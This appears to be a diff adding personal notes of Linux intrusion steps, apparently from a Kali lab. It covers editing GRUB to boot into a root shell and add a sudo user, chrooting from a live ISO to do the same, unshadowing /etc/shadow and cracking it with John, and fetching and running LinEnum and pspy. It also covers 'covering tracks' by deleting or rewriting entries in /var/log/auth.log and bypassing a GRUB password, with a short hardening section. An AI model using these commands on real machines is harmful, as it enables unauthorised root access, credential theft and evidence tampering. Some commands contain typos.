@@ -1,0 +1,156 @@
+linux Grub manipulation to Rescue Shell and adding a sudo user:
+
+on the Kali Grub screen press "e"
+
+replace: ro_quite splash
+to: rw init=/bin/bash
+
+use "ctrl +x" or "F10" to boot into Rescue Shell.
+
+Adding a user:
+adduser [user]
+only fill password.
+
+Adding user to Sudoers:
+adduser [user] sudo
+
+save changes:
+sync
+
+and reboot:
+reboot -f
+
+****************************
+
+Linux mounting to add user to sudoers:
+
+insert Kali lice ISO to the cd drive of your installed kali machine.
+
+open Terminal window
+
+find the Linux OS Drive partition:
+"fdisk -l" or "lsblk"
+
+mount /dev/sda# /mnt      -- replace the "#" with the correct partition.
+
+Bind the real filesystem to the Live one:
+mount --rbind /root /mnt/root
+chroot /mnt
+
+add sudo user:
+adduser [user]
+adduser [user] sudo
+
+save changes:
+sync
+reboot -f
+
+*****************************************
+
+Brute force attack on the Shadow file:
+
+unshadow /etc/passwd /etc/shadow > pass
+john pass
+
+if you got an error try:
+john pass --format=crypt
+
+******************************************
+
+LinEnum:
+open teminial and verify internet connection.
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+PSPY:
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+chmod +x pspy54
+./pspy64
+
+******************************************
+Covering tracks
+
+remove all the lines from a log file where the username or id found:
+cat /var/log/auth.log      |       grep –Eav “hacker|1001” > a     &&       sudo mv a /var/log/auth.log
+
+Replace in a log file username to another username:
+sed -i 's/hacker/root/g' /var/log/auth.log
+
+temp folder: 
+/tmp
+********************************************
+add Gurb Protection:
+
+make a backup:
+grub-mkconfig - [path]
+
+generate an hash:
+grub-mkpasswd-pbkdf2
+
+edit the grub configuration file:
+nano /etc/grub.d/00_header
+
+add in the end of the file:
+"
+cat << EOF
+
+set superusers="[user]"
+password_pbkdf2 [user] [generated hash]
+
+EOF
+"
+save the file and exit nano
+
+run:
+update-grub 
+ 
+
+reboot -f
+
+********************************************
+
+grub bypass
+
+insert Kali live ISO to the cd drive of your installed kali machine.
+
+open Terminal window
+
+find the Linux OS Drive partition:
+"fdisk -l" or "lsblk"
+
+mount /dev/sda# /mnt      -- replace the "#" with the correct partition.
+sudo mount --bind /dev /mnt/dev 
+sudo mount --bind /sys /mnt/sys 
+sudo mount --bind /proc /mnt/proc
+
+Bind the real filesystem to the Live one:
+chroot /mnt
+
+
+
+edit the grub configuration file:
+nano /etc/grub.d/00_header 
+
+add #
+before each line of the grub protection.
+
+save and exit the file.
+
+run 
+update-grub
+sync
+
+shutdown and remove kali live cd the reboot again.
+
+
+******************************************************
+
+
+
+
+
+
+
+
+
